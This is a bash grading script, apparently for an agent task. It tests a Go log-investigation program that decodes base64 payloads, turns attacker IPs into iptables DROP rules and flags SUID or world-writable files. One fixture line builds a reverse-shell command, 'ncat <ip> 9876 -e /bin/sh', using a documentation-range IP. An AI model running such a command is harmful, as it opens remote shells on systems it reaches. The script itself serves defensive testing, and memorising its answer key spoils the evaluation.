#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
# test_final_state.py

import os
import stat
import base64
import re
import secrets
import subprocess
import pytest


def recompute_expected():
    malicious_ips = set()
    with open("/home/user/service.log", "r") as f:
        for line in f:
            match = re.search(r'payload=([A-Za-z0-9+/=]+)', line)
            if match:
                b64_payload = match.group(1)
                try:
                    b64_payload += "=" * ((4 - len(b64_payload) % 4) % 4)
                    decoded = base64.b64decode(b64_payload).decode("utf-8")
                    if "wget" in decoded:
                        ip_match = re.search(r'wget\s+http://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', decoded)
                        if ip_match:
                            malicious_ips.add(ip_match.group(1))
                    elif "ncat" in decoded:
                        ip_match = re.search(r'ncat\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', decoded)
                        if ip_match:
                            malicious_ips.add(ip_match.group(1))
                except Exception:
                    pass

    expected_rules = [
        f"iptables -A INPUT -s {ip} -j DROP"
        for ip in sorted(malicious_ips)
    ]

    expected_vuln_files = []
    suspicious_dir = "/home/user/suspicious_dir"
    for filename in os.listdir(suspicious_dir):
        filepath = os.path.join(suspicious_dir, filename)
        if os.path.isfile(filepath):
            mode = os.stat(filepath).st_mode
            if mode & stat.S_ISUID or mode & stat.S_IWOTH:
                expected_vuln_files.append(filename)
    expected_vuln_files.sort()
    return expected_rules, expected_vuln_files


def read_nonempty_lines(path):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]


def run_investigator(binary):
    for output in ("/home/user/block.sh", "/home/user/vuln_files.txt"):
        try:
            os.unlink(output)
        except FileNotFoundError:
            pass
    subprocess.run([binary], cwd="/home/user", check=True, timeout=20)
    assert os.path.isfile("/home/user/block.sh"), "Program did not generate /home/user/block.sh"
    assert os.path.isfile("/home/user/vuln_files.txt"), "Program did not generate /home/user/vuln_files.txt"


def test_00_investigate_go_builds_and_generates_outputs():
    source = "/home/user/investigate.go"
    assert os.path.isfile(source), f"File {source} does not exist or is not a regular file."

    binary = "/tmp/investigate_submission"
    subprocess.run(
        ["go", "build", "-o", binary, source],
        cwd="/home/user",
        check=True,
        timeout=30,
    )

    log_path = "/home/user/service.log"
    suspicious_dir = "/home/user/suspicious_dir"
    with open(log_path, "rb") as f:
        original_log = f.read()

    dynamic_ip = f"192.0.2.{secrets.randbelow(254) + 1}"
    dynamic_payload = base64.b64encode(
        f"ncat {dynamic_ip} 9876 -e /bin/sh".encode("utf-8")
    ).decode("ascii")
    dynamic_line = (
        f"[verification] GET /api/v1/health?payload={dynamic_payload} HTTP/1.1\n"
    ).encode("utf-8")

    while True:
        dynamic_name = f"verifier_vuln_{secrets.token_hex(8)}"
        dynamic_path = os.path.join(suspicious_dir, dynamic_name)
        if not os.path.exists(dynamic_path):
            break

    try:
        with open(log_path, "ab") as f:
            if original_log and not original_log.endswith(b"\n"):
                f.write(b"\n")
            f.write(dynamic_line)
        with open(dynamic_path, "wb"):
            pass
        os.chmod(dynamic_path, 0o666)

        expected_rules, expected_files = recompute_expected()
        assert dynamic_ip in "\n".join(expected_rules)
        assert dynamic_name in expected_files

        run_investigator(binary)
        assert read_nonempty_lines("/home/user/block.sh") == expected_rules
        assert read_nonempty_lines("/home/user/vuln_files.txt") == expected_files
    finally:
        with open(log_path, "wb") as f:
            f.write(original_log)
        try:
            os.unlink(dynamic_path)
        except FileNotFoundError:
            pass

    # Generate the final artifacts from the restored, original inputs. The
    # existing final-state assertions below independently verify their content.
    run_investigator(binary)


def test_block_sh_content():
    block_sh_path = "/home/user/block.sh"
    assert os.path.isfile(block_sh_path), f"File {block_sh_path} does not exist."

    # Recompute expected IPs from the log file
    log_path = "/home/user/service.log"
    assert os.path.isfile(log_path), f"File {log_path} is missing."

    malicious_ips = set()
    with open(log_path, "r") as f:
        for line in f:
            match = re.search(r'payload=([A-Za-z0-9+/=]+)', line)
            if match:
                b64_payload = match.group(1)
                try:
                    # Pad the base64 string if necessary
                    b64_payload += "=" * ((4 - len(b64_payload) % 4) % 4)
                    decoded = base64.b64decode(b64_payload).decode('utf-8')

                    if 'wget' in decoded:
                        ip_match = re.search(r'wget\s+http://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', decoded)
                        if ip_match:
                            malicious_ips.add(ip_match.group(1))
                    elif 'ncat' in decoded:
                        ip_match = re.search(r'ncat\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', decoded)
                        if ip_match:
                            malicious_ips.add(ip_match.group(1))
                except Exception:
                    pass

    sorted_ips = sorted(list(malicious_ips))
    expected_lines = [f"iptables -A INPUT -s {ip} -j DROP" for ip in sorted_ips]

    with open(block_sh_path, "r") as f:
        actual_lines = [line.strip() for line in f if line.strip()]

    assert actual_lines == expected_lines, f"Contents of {block_sh_path} do not match expected firewall rules. Expected: {expected_lines}, Got: {actual_lines}"


def test_vuln_files_txt_content():
    vuln_files_path = "/home/user/vuln_files.txt"
    assert os.path.isfile(vuln_files_path), f"File {vuln_files_path} does not exist."

    suspicious_dir = "/home/user/suspicious_dir"
    assert os.path.isdir(suspicious_dir), f"Directory {suspicious_dir} is missing."

    # Recompute expected vulnerable files
    expected_vuln_files = []
    for filename in os.listdir(suspicious_dir):
        filepath = os.path.join(suspicious_dir, filename)
        if os.path.isfile(filepath):
            st = os.stat(filepath)
            mode = st.st_mode
            is_suid = bool(mode & stat.S_ISUID)
            is_world_writable = bool(mode & stat.S_IWOTH)

            if is_suid or is_world_writable:
                expected_vuln_files.append(filename)

    expected_vuln_files.sort()

    with open(vuln_files_path, "r") as f:
        actual_files = [line.strip() for line in f if line.strip()]

    assert actual_files == expected_vuln_files, f"Contents of {vuln_files_path} do not match expected vulnerable files. Expected: {expected_vuln_files}, Got: {actual_files}"


def test_original_files_unmodified():
    # Check that service.log hasn't been modified (basic line count/content check)
    log_path = "/home/user/service.log"
    assert os.path.isfile(log_path), f"File {log_path} is missing."
    with open(log_path, "r") as f:
        lines = f.readlines()
    assert len(lines) == 6, f"File {log_path} seems to have been modified (incorrect number of lines)."
    assert "ZWNobyAiaGVsbG8i" in lines[0], f"File {log_path} seems to have been modified."

    # Check that suspicious_dir contents haven't been modified
    files_to_check = {
        "clean_file.txt": 0o644,
        "backdoor_bin": 0o4755,
        "config.json": 0o777,
        "script.sh": 0o755,
        "suid_script": 0o4644
    }

    for filename, expected_mode in files_to_check.items():
        filepath = f"/home/user/suspicious_dir/{filename}"
        assert os.path.isfile(filepath), f"Original file {filepath} was deleted or moved."
        st = os.stat(filepath)
        actual_mode = stat.S_IMODE(st.st_mode)
        assert actual_mode == expected_mode, f"Permissions of {filepath} were modified. Expected {oct(expected_mode)}, got {oct(actual_mode)}"
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
